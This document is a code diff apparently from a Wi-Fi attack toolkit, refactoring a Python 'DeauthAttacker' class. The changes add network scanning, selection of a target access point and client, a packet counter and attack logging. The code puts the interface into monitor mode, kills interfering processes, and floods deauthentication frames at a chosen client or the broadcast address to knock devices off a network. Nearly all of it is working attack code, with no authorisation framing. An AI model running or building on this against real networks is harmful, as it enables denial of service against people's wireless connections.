@@ -9,6 +9,7 @@ import time
 import os
 import subprocess
 from modules.utils import (
+    check_wireless_tools,
     get_interface,
     setup_monitor_mode,
     scan_networks,
@@ -36,99 +37,54 @@ class DeauthAttacker:
         self.status_thread = None
         self.clients = set()
 
-    def _check_wireless_tools(self):
-        """Check if required wireless tools are available"""
-        try:
-            subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            return True
-        except FileNotFoundError:
-            self.console.print("[red]Error: wireless-tools not found. Please install wireless-tools package.[/red]")
-            return False
-            
-    def _get_interface(self):
-        """Get wireless interface from user"""
-        try:
-            # Get list of wireless interfaces
-            result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            interfaces = []
-            
-            for line in result.stdout.decode().split('\n'):
-                if 'IEEE 802.11' in line:
-                    interface = line.split()[0]
-                    interfaces.append(interface)
-                    
-            if not interfaces:
-                self.console.print("[red]No wireless interfaces found![/red]")
-                return None
-                
-            # Create selection table
-            table = Table(title="Available Wireless Interfaces")
-            table.add_column("Option", style="cyan", justify="right")
-            table.add_column("Interface", style="green")
-            
-            for i, interface in enumerate(interfaces, 1):
-                table.add_row(str(i), interface)
-                
-            self.console.print(table)
-            
-            while True:
-                try:
-                    choice = int(input("\nSelect interface: "))
-                    if 1 <= choice <= len(interfaces):
-                        return interfaces[choice-1]
-                    else:
-                        self.console.print("[red]Invalid choice. Please try again.[/red]")
-                except ValueError:
-                    self.console.print("[red]Invalid input. Please enter a number.[/red]")
-                    
-        except Exception as e:
-            self.console.print(f"[red]Error getting wireless interfaces: {str(e)}[/red]")
-            return None
-            
-    def _enable_monitor_mode(self):
-        """Enable monitor mode on selected interface"""
-        try:
-            # Kill interfering processes
-            subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
-            # Start monitor mode
-            result = subprocess.run(['airmon-ng', 'start', self.interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            
-            # Check if monitor mode is enabled
-            check = subprocess.run(['iwconfig', self.interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            if 'Mode:Monitor' in check.stdout.decode():
-                return True
-                
-            # If interface name changed, update it
-            for line in result.stdout.decode().split('\n'):
-                if '(monitor mode enabled on' in line:
-                    self.interface = line.split('on')[1].strip().strip(')')
-                    return True
-                    
-            return False
-            
-        except Exception as e:
-            self.console.print(f"[red]Error enabling monitor mode: {str(e)}[/red]")
-            return False
-            
     def _get_target_info(self):
         """Get target AP and client information"""
         try:
-            self.target_bssid = input("\nEnter target AP BSSID (or press Enter to target all clients): ").strip()
-            if self.target_bssid:
-                self.target_client = input("Enter target client MAC (or press Enter to target all clients): ").strip()
-                if not self.target_client:
-                    self.target_client = "FF:FF:FF:FF:FF:FF"  # Broadcast address
-            else:
-                self.console.print("[yellow]No AP specified. Will target all detected networks.[/yellow]")
-                self.target_client = "FF:FF:FF:FF:FF:FF"
+            # First scan for networks
+            networks = scan_networks(self.interface)
+            if not networks:
+                return False
+
+            # Let user select target
+            self.target_bssid, self.target_channel, self.target_essid, clients = select_target(networks)
+            if not self.target_bssid:
+                return False
+
+            # Get target client if any clients are connected
+            if clients:
+                table = Table(title="Connected Clients")
+                table.add_column("Index", style="cyan")
+                table.add_column("Client MAC", style="green")
                 
+                for idx, client in enumerate(clients, 1):
+                    table.add_row(str(idx), client)
+                
+                self.console.print(table)
+                
+                choice = input("\nSelect client number (or press Enter to target all clients): ").strip()
+                if choice:
+                    try:
+                        idx = int(choice) - 1
+                        if 0 <= idx < len(clients):
+                            self.target_client = clients[idx]
+                        else:
+                            self.console.print("[red]Invalid choice. Targeting all clients.[/red]")
+                            self.target_client = "FF:FF:FF:FF:FF:FF"
+                    except ValueError:
+                        self.console.print("[red]Invalid input. Targeting all clients.[/red]")
+                        self.target_client = "FF:FF:FF:FF:FF:FF"
+                else:
+                    self.target_client = "FF:FF:FF:FF:FF:FF"
+            else:
+                self.console.print("[yellow]No clients connected. Targeting all potential clients.[/yellow]")
+                self.target_client = "FF:FF:FF:FF:FF:FF"
+
             return True
-            
+
         except Exception as e:
             self.console.print(f"[red]Error getting target information: {str(e)}[/red]")
             return False
-            
+
     def _send_deauth(self, target_ap, target_client):
         """Send deauthentication packets"""
         # Create deauth packet
@@ -144,98 +100,97 @@ class DeauthAttacker:
         while self.running:
             try:
                 sendp(packet, iface=self.interface, count=1, verbose=False)
+                self.packets_sent += 1
                 time.sleep(0.1)  # Prevent flooding
             except:
                 continue
-                
+
     def start_attack(self):
         """Start deauthentication attack"""
         try:
             # Check requirements
-            if not self._check_wireless_tools():
+            if not check_wireless_tools():
                 return
-                
+
             # Get wireless interface
-            self.interface = self._get_interface()
+            self.interface = get_interface()
             if not self.interface:
                 return
-                
+
             # Enable monitor mode
             self.console.print("\n[yellow]Enabling monitor mode...[/yellow]")
-            if not self._enable_monitor_mode():
+            self.interface = setup_monitor_mode(self.interface)
+            if not self.interface:
                 self.console.print("[red]Failed to enable monitor mode![/red]")
                 return
-                
+
             self.console.print("[green]Monitor mode enabled successfully![/green]")
-            
+
             # Get target information
             if not self._get_target_info():
                 return
-                
+
             # Start attack
             self.console.print("\n[yellow]Starting deauthentication attack...[/yellow]")
             self.console.print("[cyan]Press Ctrl+C to stop the attack[/cyan]")
-            
+
             self.running = True
-            
+            self.start_time = time.time()
+
             # Create attack thread
-            if self.target_bssid:
-                attack_thread = Thread(target=self._send_deauth, 
-                                    args=(self.target_bssid, self.target_client))
-                attack_thread.daemon = True
-                attack_thread.start()
-                
-                # Display progress
-                with Progress() as progress:
-                    task = progress.add_task("[cyan]Running attack...", total=None)
-                    
-                    try:
-                        while self.running:
-                            time.sleep(1)
-                    except KeyboardInterrupt:
-                        self.running = False
-                        
-            else:
-                # Sniff for networks and attack all
-                def packet_handler(pkt):
-                    if pkt.haslayer(Dot11Beacon):
-                        bssid = pkt[Dot11].addr2
-                        Thread(target=self._send_deauth, 
-                              args=(bssid, "FF:FF:FF:FF:FF:FF")).start()
-                        
-                with Progress() as progress:
-                    task = progress.add_task("[cyan]Scanning and attacking...", total=None)
-                    
-                    try:
-                        sniff(iface=self.interface, prn=packet_handler, store=0)
-                    except KeyboardInterrupt:
-                        self.running = False
-                        
+            attack_thread = Thread(target=self._send_deauth,
+                                args=(self.target_bssid, self.target_client))
+            attack_thread.daemon = True
+            attack_thread.start()
+
+            # Display progress
+            with Progress() as progress:
+                task = progress.add_task(
+                    f"[cyan]Attacking {self.target_essid or self.target_bssid}...",
+                    total=None
+                )
+
+                try:
+                    while self.running:
+                        progress.update(
+                            task,
+                            description=f"[cyan]Attacking {self.target_essid or self.target_bssid} "
+                                      f"(Packets: {self.packets_sent})[/cyan]"
+                        )
+                        time.sleep(1)
+                except KeyboardInterrupt:
+                    self.running = False
+
             # Log activity
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            log_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
-                                  'data', 'deauth', f'deauth_{timestamp}.txt')
-                                  
+            log_path = get_data_path('deauth', f'deauth_{timestamp}.txt')
+
             with open(log_path, 'w') as f:
                 f.write(f"Deauthentication Attack Log\n")
                 f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                 f.write(f"Interface: {self.interface}\n")
-                f.write(f"Target AP: {self.target_bssid if self.target_bssid else 'All'}\n")
-                f.write(f"Target Client: {self.target_client if self.target_client != 'FF:FF:FF:FF:FF:FF' else 'All'}\n")
-                
+                f.write(f"Target AP: {self.target_bssid}\n")
+                f.write(f"Target ESSID: {self.target_essid}\n")
+                f.write(f"Target Client: {self.target_client}\n")
+                f.write(f"Packets Sent: {self.packets_sent}\n")
+                f.write(f"Duration: {int(time.time() - self.start_time)} seconds\n")
+
             self.console.print(f"\n[green]Attack log saved to: {log_path}[/green]")
-            
+            log_activity(f"Deauth attack completed - Target: {self.target_essid or self.target_bssid}")
+
         except Exception as e:
             self.console.print(f"[red]Error during attack: {str(e)}[/red]")
-            
+
         finally:
             # Cleanup
             self.running = False
             try:
-                subprocess.run(['airmon-ng', 'stop', self.interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                subprocess.run(['airmon-ng', 'stop', self.interface],
+                             stdout=subprocess.DEVNULL,
+                             stderr=subprocess.DEVNULL)
             except:
                 pass
-            
+
             input("\nPress Enter to continue...")
 
     def send_deauth_packets(self):
